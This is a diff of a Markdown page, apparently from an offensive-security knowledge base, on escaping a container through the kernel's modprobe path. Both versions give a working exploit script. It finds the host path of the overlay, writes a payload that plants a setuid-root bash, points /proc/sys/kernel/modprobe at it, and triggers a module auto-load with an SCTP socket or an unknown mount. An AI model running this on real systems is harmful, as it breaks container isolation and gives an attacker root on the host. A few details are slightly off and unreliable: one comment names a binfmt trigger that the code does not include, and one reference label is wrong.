@@ -1,41 +1,59 @@
 ---
-title: "modprobe path: host code execution through the module loader helper"
-description: "Escaping a container by overwriting /proc/sys/kernel/modprobe, the path the kernel runs to auto-load a module, so that triggering a module load executes the attacker's program on the host as root."
+title: "modprobe path: hijacking the kernel module auto-loader"
+description: "The kernel runs the program named in /proc/sys/kernel/modprobe, as root in the host namespaces, whenever it needs to auto-load a module. A container able to write that path points it at a payload and then triggers an auto-load, for example by using an unknown network protocol or filesystem type, causing the kernel to execute the payload on the host."
 keywords:
-  - modprobe
-  - modprobe_path
-  - kernel module loader
+  - modprobe path
+  - module autoload
+  - usermode helper
+  - request_module
   - container escape
-  - procfs escape
 ---
 
 # modprobe path
 
-`/proc/sys/kernel/modprobe` holds the path the kernel executes, as root in the host context, whenever it needs to auto-load a kernel module. Overwrite it with a helper on a host-visible path, then trigger a module auto-load and the helper runs on the host.
+When the kernel needs a module it does not have loaded, it calls `request_module`, which runs the user-space helper named in `/proc/sys/kernel/modprobe` (normally `/sbin/modprobe`). That helper runs as root in the host's initial namespaces. If a container can write `modprobe` on the host's procfs, it replaces the helper path with its own payload, then triggers any action that makes the kernel attempt an auto-load, and the kernel executes the payload on the host.
+
+Confirm writability:
 
 ```bash
-# Requires CAP_SYS_ADMIN in the initial namespace or a writable host /proc
-host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
-
-cat > /x <<'SH'
-#!/bin/sh
-cp /bin/busybox /host_marker && chmod +s /host_marker
-SH
-chmod +x /x
-
-echo "$host_path/x" > /proc/sys/kernel/modprobe
-
-# Trigger an auto-load of a non-existent module: a socket with an unknown family/protocol works
-python3 -c 'import socket; socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0x1234)' 2>/dev/null || true
+cat /proc/sys/kernel/modprobe
+[ -w /proc/sys/kernel/modprobe ] && echo writable
 ```
+
+## The technique
+
+```bash
+# 1. Host-resolvable payload path via the overlay upperdir
+host=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /proc/self/mountinfo | head -1)
+cat > /payload <<SH
+#!/bin/sh
+cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
+id > $host/out 2>&1
+SH
+chmod +x /payload
+
+# 2. Point the module loader at the payload
+echo "$host/payload" > /proc/sys/kernel/modprobe
+
+# 3. Trigger an auto-load. Any of these makes the kernel call request_module:
+#    use a socket for a protocol family with no loaded module,
+python3 -c 'import socket; socket.socket(socket.AF_INET, socket.SOCK_STREAM, 132)' 2>/dev/null
+#    or mount an unknown filesystem type,
+mount -t doesnotexist none /mnt 2>/dev/null
+#    or run a binary with an unknown magic that needs a binfmt module
+sleep 1; cat /out; ls -l /tmp/rootbash
+```
+
+The socket call with an obscure protocol number (here SCTP, 132) causes the kernel to `request_module("net-pf-...")`, invoking the modprobe path, which is now the payload.
 
 ## Exploitation notes
 
-- The module request runs `modprobe` as the path you set, so the value is attacker-controlled code with no module actually involved.
-- Many actions trigger an auto-load: an unusual socket protocol, a filesystem type, or a netfilter feature; any one that reaches the kernel's `request_module` works.
-- Same writability gate and host-visible-path requirement as [core_pattern](core_pattern.md).
+- The trigger must be an action the kernel services by auto-loading a module; a protocol family or filesystem type that is genuinely absent on the host works best. If the module is already loaded, no `request_module` fires, so pick an obscure one.
+- Like the other usermode-helper routes, the payload path has to resolve on the host filesystem, hence the `upperdir` recovery.
+- Writing `modprobe` needs the host's procfs mounted writable, which usually implies `CAP_SYS_ADMIN` or `--privileged`; a container's namespaced sysctl view would not affect the host.
 
 ## References
 
-- [man 5 proc](https://man7.org/linux/man-pages/man5/proc.5.html)
-- [Kernel: request_module and modprobe](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
+- [Kernel docs: modprobe sysctl](https://docs.kernel.org/admin-guide/sysctl/kernel.html#modprobe)
+- [man 2 request_key / kmod behaviour](https://man7.org/linux/man-pages/man8/modprobe.8.html)
+- [HackTricks: modprobe escape](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/sensitive-mounts)
